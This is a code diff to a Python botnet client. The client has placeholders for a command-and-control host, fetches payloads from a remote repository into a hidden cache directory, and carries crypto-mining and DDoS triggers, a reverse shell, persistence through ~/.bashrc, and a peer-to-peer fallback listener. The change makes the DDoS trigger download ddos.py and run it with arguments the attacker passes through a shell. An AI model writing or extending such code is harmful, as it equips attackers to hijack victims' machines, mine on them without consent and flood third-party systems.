@@ -6,7 +6,7 @@ import sys
 SECRET_KEY = b'Sixteen byte key'
 C2_HOST = 'YOUR.C2.IP.HERE'
 C2_PORT = 4444
-PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/"  # Remote repo
+PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
 
@@ -38,10 +38,17 @@ def run_payload(name):
         return f"[!] Payload {name} not found."
 
 def handle_trigger(cmd):
-    if cmd == "trigger_mine":
+    if cmd.startswith("trigger_ddos"):
+        parts = cmd.split()
+        fetch_payload("ddos.py")
+        path = os.path.join(HIDDEN_DIR, "ddos.py")
+        args = " ".join(parts[1:])  # Strip 'trigger_ddos'
+        full_cmd = f"python3 {path} {args}"
+        return subprocess.getoutput(full_cmd)
+
+    elif cmd == "trigger_mine":
         return run_payload("mine.py")
-    elif cmd == "trigger_ddos":
-        return run_payload("ddos.py")
+
     return None
 
 def reverse_shell():
@@ -71,7 +78,7 @@ def handle_command(cmd):
         _, name = cmd.split()
         return run_payload(name)
 
-    elif cmd in ["trigger_mine", "trigger_ddos"]:
+    elif cmd.startswith("trigger_ddos") or cmd == "trigger_mine":
         return handle_trigger(cmd) or "[!] Trigger failed"
 
     elif cmd == "reverse_shell":
@@ -107,7 +114,7 @@ def setup_persistence():
         with open(os.path.expanduser("~/.bashrc"), "a") as f:
             f.write(f"\n(sleep 10 && python3 {target} &) &\n")
         os.chmod(target, 0o700)
-        
+
 def p2p_fallback_listener():
     peer_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     peer_sock.bind(('0.0.0.0', 7007))
@@ -127,4 +134,3 @@ threading.Thread(target=p2p_broadcast_ping, daemon=True).start()
 fake_name()
 setup_persistence()
 connect()
-
